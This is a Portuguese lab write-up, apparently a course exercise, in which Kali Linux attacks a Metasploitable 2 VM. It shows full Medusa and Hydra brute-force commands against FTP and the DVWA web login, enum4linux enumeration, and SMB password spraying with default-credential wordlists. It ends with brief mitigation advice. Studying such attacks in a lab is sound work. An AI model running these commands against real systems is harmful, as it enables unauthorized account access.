# Desafio-kali -  Pentest prático em ambiente local

## Autor: **Eduardo Felipe**

## Resumo:  
Projeto prático que demonstra a implantação e execução de ataques de força bruta e password spraying em um ambiente de laboratório usando Kali Linux, Metasploitable 2, Medusa, Hydra e ferramentas auxiliares (enum4linux, smbclient). O objetivo é entender técnicas ofensivas e principalmente, documentar recomendações de mitigação.  

## **Download Kali Linux e Metasploitable 2**

[Kali Linux](https://www.kali.org/)  
[Metasploitable 2](https://sourceforge.net/projects/metasploitable2/files/metasploitable-linux-2.0.0.zip/download)


## Configurando o Metasploitable 2 com o Kali Linux

_Configurações > Expert > Rede > Ligado a > host-only_

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap01.png" alt ="Screenshot 1" width="650">

## Verificando a conexão das imagens
```ping -c 3 192.168.56.102```   

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap02.png" alt ="Screenshot 2" width="650">

## Criando Wordlists
### Colocando nomes e usuários comuns em diferentes arquivos
### Com o comando abaixo criamos um arquivo de nome **users.txt** e nele inserimos alguns nomes de usuários padrões: 
```echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt```
### Criamos também um arquivo de nome **pass.txt** e inserimos algumas senhas padrões, usando o seguinte código:
```echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt```

## Rodando o primeiro ataque usando o Medusa  
Utilizando o medusa uso o a linha de comando **-h** seguido do host alvo, em seguida **-U** e informo o nome do arquivo com a lista de usuário, após isso **-P** com o nome do arquivo com a lista de senhas, seguindo com **-M ftp** para informar qual serviço será atacado e por fim **-t 6** para usar 6 Threads simultâneas, deixando a linha de código da seguinte forma:  

```
medusa -h 192.168.56.102 -U usesr.txt -P pass.txt -M ftp -t 6
```

Após rodar o código analisamos e buscamos quais resultados obtiveram **Sucesso**  

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap03.png" alt ="Screenshot 3" width="650">

## Estabelecendo a conexão com o alvo  
Tendo descoberto as credenciais de acesso ao FTP, vamos para a tentativa de conexão e acesso usando o comando:  
```ftp 192.168.56.102```  
É solicitado o login e senha, mas agora já sabemos que ambos são **msfadmin** e assim obtemos o **Login sucessful**  

 <img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap04.png" alt ="Screenshot 4" width="650">


 ## Automatizando tentativas de ataque a formulários web (DVWA) usando Hydra

Inicialmente criamos as Wordlists para usuários e senhas como já foi feito anteriormente:

```
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```


Criados as Wordlists vamos para o ataque de Brute Force com o Hydra, e pra isso passamos os seguintes parâmentros para o hydra:

```
hydra -L users.txt -P pass.txt 192.168.56.102 http-form-post /
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6 -f 
```
<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap05.png" alt ="Screenshot 5" width="650">

-  ```-L users.txt``` e ```-P pass.txt``` são as wordlists.  
-  ```http-form-post``` e a string ```"/path:postdata:fail-string"```.  
- ``` ^USER^``` e ```^PASS^``` serão substituídos.  
-  ```-V``` visualizar cada tentativa.  

## Executando **password spraying** em SMB com enumeração de usuários  
Diferentemente do Brute Force que testa várias senhas em um usuário, o password spraying testa algumas senhas (mais comuns) em diversos usuários diferentes.

### Utilizando o ```enum4linux``` passo seguinte comando para obtenção de informações.

```
enum4linux -a 192.168.56.102 > enum4linux_output.txt
```
<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap06.png" alt ="Screenshot 6" width="650">  
Dessa forma pode-se coletar lista de usuários e outras informações úteis.

### Nesse momento devo criar minhas wordlists para os usuários e senhas possíveis.

```
echo -e "user\nmsfadmin\nservice" > smb_users.txt

echo -e "password\nsenha\n123456\Welcome123\nmsfadmin" > senhas_spray.txt
```
### Criada as wordlist, utilizando o **medusa** para tentar encontrar as credenciais, conforme código e imagem:  
<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/Snap07.png" alt ="Screenshot 7" width="650">  

Assim é encontrado as credenciais conforme as wordlists.
### Para confirmar o acesso vamos testar usando o ```smbclient```   
```
smbclient -L //192.168.56.102 -U msfadmin
```
É solicitado uma senha e vamos testar uma senha qualquer para testar.
<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap08.png" alt ="Screenshot 8" width="650">
Senha Incorreta  

Agora vamos testar a senha encontrada com o medusa.  

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap09.png" alt ="Screenshot 9" width="650">  

Pronto! Conseguimos acesso.  



## Conclusão  
Neste desafio foi possível montar um ambiente de teste, executar ataques de força bruta em FTP e formularios web, e realizar password spraying em SMB com enumeração de usuários. O exercício reforça a importância de boas políticas de senha, MFA e monitoramento para mitigar riscos de comprometimento por ataques de força bruta e password spraying.

